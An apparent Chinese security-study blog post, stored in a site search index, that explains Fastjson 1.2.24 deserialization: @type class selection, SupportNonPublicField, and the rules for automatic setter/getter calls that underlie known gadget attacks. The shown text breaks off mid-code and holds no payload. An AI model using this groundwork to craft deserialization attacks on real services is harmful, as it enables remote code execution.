<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/08/26/Fastjson/"/>
    <url>/2024/08/26/Fastjson/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><h2 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h2><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject&#x2F;JSON.parse来分别实现序列化和反序列化操作。</p><p>项目地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><h2 id="演示代码demo"><a href="#演示代码demo" class="headerlink" title="演示代码demo"></a>演示代码demo</h2><p>首先在pom.xml添加依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.2</span><span class="hljs-number">.24</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p><code>Student.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>序列化函数：<code>JSON.toJsonString()</code></p><p>反序列化函数：<code>JSON.parseObject/JSON.parse</code></p><h3 id="序列化demo"><a href="#序列化demo" class="headerlink" title="序列化demo"></a>序列化demo</h3><p><code>StudentSerialize.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentSerialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;cmisl&quot;</span>);<br>        student.setAge(<span class="hljs-number">18</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);<br>        System.out.println(jsonString);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><em>SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter&#x2F;setter&#x2F;is方法。</em></p><p>Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</p><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 设置了SerializerFeature.WriteClassName</span><br>构造函数<br>setName<br>setAge<br>getAge<br>getName<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.example.Demo.Student&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;cmisl&quot;</span>&#125;<br><br><span class="hljs-comment">// 未设置SerializerFeature.WriteClassName</span><br>构造函数<br>setName<br>setAge<br>getAge<br>getName<br>&#123;<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;cmisl&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>我们可以跟一下序列化部分。直接跟进JSON.toJSONString函数，因为是对Student对象序列化，所以序列化对的逻辑应该就是在serializer.write(object)里面了。</p><p><img src="/../../pict/image-20240612202019164.png" alt="image-20240612202019164"></p><h3 id="反序列化demo"><a href="#反序列化demo" class="headerlink" title="反序列化demo"></a>反序列化demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentUnserialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Demo.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;cmisl\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">构造函数<br>setAge<br>setName<br>org.example.Demo.Student@<span class="hljs-number">14514713</span><br>org.example.Demo.Student<br></code></pre></td></tr></table></figure><h2 id="反序列化时的-Feature-SupportNonPublicField-参数"><a href="#反序列化时的-Feature-SupportNonPublicField-参数" class="headerlink" title="反序列化时的 Feature.SupportNonPublicField 参数"></a>反序列化时的 Feature.SupportNonPublicField 参数</h2><p>我们把setAge函数注释掉，age作为一个私有变量，如果我们反序列化时，一个变量是私有的，并且没有对应的setter函数，那么反序列化的时候就会返回null，不会真正实现这个变量，这时候就需要用到SupportNonPublicField 参数了，这样我们的私有变量就可以正常反序列化了。</p><p>由于该字段在fastjson1.2.22版本引入，所以只能影响1.2.22-1.2.24</p><p><code>未使用SupportNonPublicField </code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentUnserialize_demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Demo.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;cmisl\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonstring, Student.class);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>        System.out.println(obj.getName() + <span class="hljs-string">&quot; &quot;</span> + obj.getAge());<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">构造函数<br>setName<br>org.example.Demo.Student@<span class="hljs-number">14514713</span><br>org.example.Demo.Student<br>getName<br>getAge<br>cmisl <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><code>使用SupportNonPublicField </code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentUnserialize_demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Demo.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;cmisl\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>        System.out.println(obj.getName() + <span class="hljs-string">&quot; &quot;</span> + obj.getAge());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">构造函数<br>setName<br>org<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.Demo</span>.Student@<span class="hljs-number">14514713</span><br>org<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.Demo</span><span class="hljs-selector-class">.Student</span><br>getName<br>getAge<br>cmisl <span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p>可以看到现在我们的age成功反序列化出来了。</p><h2 id="JSON-parseObject不指定Object-class"><a href="#JSON-parseObject不指定Object-class" class="headerlink" title="JSON.parseObject不指定Object.class"></a>JSON.parseObject不指定Object.class</h2><p>调整student类如下，所有私有变量不设置setter函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String address;<br>    <span class="hljs-keyword">private</span> Properties properties;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAddress</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAddress&quot;</span>);<br>        <span class="hljs-keyword">return</span> address;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Properties <span class="hljs-title function_">getProperties</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getProperties&quot;</span>);<br>        <span class="hljs-keyword">return</span> properties;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentUnserialize_demo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Demo.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;cmisl\&quot;,\&quot;address\&quot;:\&quot;wuhan\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;<br><span class="hljs-comment">//        Student obj =JSON.parseObject(jsonstring);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonstring);<br>        <span class="hljs-comment">// 或以下语句，输出结果一致</span><br><span class="hljs-comment">//        JSONObject obj = JSONObject.parseObject(jsonstring);</span><br><br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">构造函数<br>setName<br>getProperties<br>getAddress<br>getAge<br>getName<br>getProperties<br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;cmisl&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">0</span>&#125;<br>com.alibaba.fastjson.JSONObject<br></code></pre></td></tr></table></figure><p>从输出结果来看，我们调用了Student类的构造函数，以及setter方法，和getter方法，但无论定义的对象是Object还是JSONObject，最后反序列化得到的都是JSONObject类对象，可以看到是未反序列化成功的。</p><p>我们来为JSON.parseObject指定反序列化类型(设置第二个参数)，为Object.class或Student.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentUnserialize_demo3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Demo.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;cmisl\&quot;,\&quot;address\&quot;:\&quot;wuhan\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonstring,Object.class);<br>        <span class="hljs-comment">// 或以下语句，输出结果一致</span><br><span class="hljs-comment">//        Object obj = JSONObject.parseObject(jsonstring,Student.class);</span><br><span class="hljs-comment">//        Student obj= JSONObject.parseObject(jsonstring,Student.class);</span><br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">构造函数<br>setName<br>getProperties<br>org.example.Demo.Student@1de0aca6<br>org.example.Demo.Student<br></code></pre></td></tr></table></figure><p>可以看到这次反序列化成功，获取到了Student这个类，我们为<code>JSON.parseObject</code>指定反序列化类型(设置第二个参数)，那么通过<code>@type</code>的作用，会将JSON转换成对应的类。如果没有<code>@type</code>，我们也可以通过第二个参数来控制需要转换成的类。可以参考下面代码，输出和上面一样。<code>JSON.parseObject</code>如果不指定反序列化类型(设置第二个参数)，则会返回<code>fastjson.JSONObject</code>，无法将传入的类进行转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentUnserialize_demo4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;cmisl\&quot;,\&quot;address\&quot;:\&quot;wuhan\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonstring,Student.class);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="一些结论"><a href="#一些结论" class="headerlink" title="一些结论"></a>一些结论</h2><p>感觉自己说不出什么花来，还是在前辈的文章上学习，索性直接引用 <a href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"> Mi1k7ea </a>师傅的结论</p><p>根据前面的结果，有如下结论：</p><ul><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；</li><li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li></ul><p><strong>Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</strong></p><p>满足条件的setter：</p><ul><li>函数名长度大于4且以set开头</li><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>函数名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><h2 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h2><p>还记的前面提到的反序列化方法吗，JSON.parseObject&#x2F;JSON.parse，我们浅浅研究了下JSON.parseObject，那么JSON.parse和它比有什么区别呢?</p><ul><li><p>**<code>parse()</code>**：</p><ul><li><p>返回的是 <code>JSONObject</code> 类型。它会将 JSON 字符串解析为 <code>JSONObject</code>，适用于在没有特定类定义的情况下处理 JSON 数据。适用于在没有特定类定义的情况下，需要动态处理 JSON 数据时。</p></li><li><p>返回的是实际类型的对象。根据输入的 JSON 字符串和传入的类类型，它会返回一个对应的 Java 对象。适用于当你有明确的类定义并希望直接得到该类的实例时。 </p></li><li><p>适用于当你有明确的类定义并希望直接得到该类的实例时。</p></li><li><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;John\&quot;,\&quot;age\&quot;:30&#125;&quot;</span>;<br><span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString, Person.class);<br></code></pre></td></tr></table></figure></li><li><p>在这种情况下，<code>Person</code> 类中的 setter 方法会被调用，直接返回 <code>Person</code> 类的实例。</p></li></ul></li><li><p>**<code>parseObject()</code>**：</p><ul><li><p>适用于在没有特定类定义的情况下，需要动态处理 JSON 数据时。</p></li><li><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;John\&quot;,\&quot;age\&quot;:30&#125;&quot;</span>;<br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString);<br></code></pre></td></tr></table></figure></li><li><p>这会返回一个 <code>JSONObject</code>，可以通过 <code>jsonObject.getString(&quot;name&quot;)</code> 和 <code>jsonObject.getIntValue(&quot;age&quot;)</code> 来访问数据。</p></li></ul></li></ul><p>也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentUnserialize_demo5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Demo.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;cmisl\&quot;,\&quot;address\&quot;:\&quot;wuhan\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parse(jsonstring);<br>        <span class="hljs-comment">// 或以下语句，输出结果一致</span><br><span class="hljs-comment">//        Object obj = 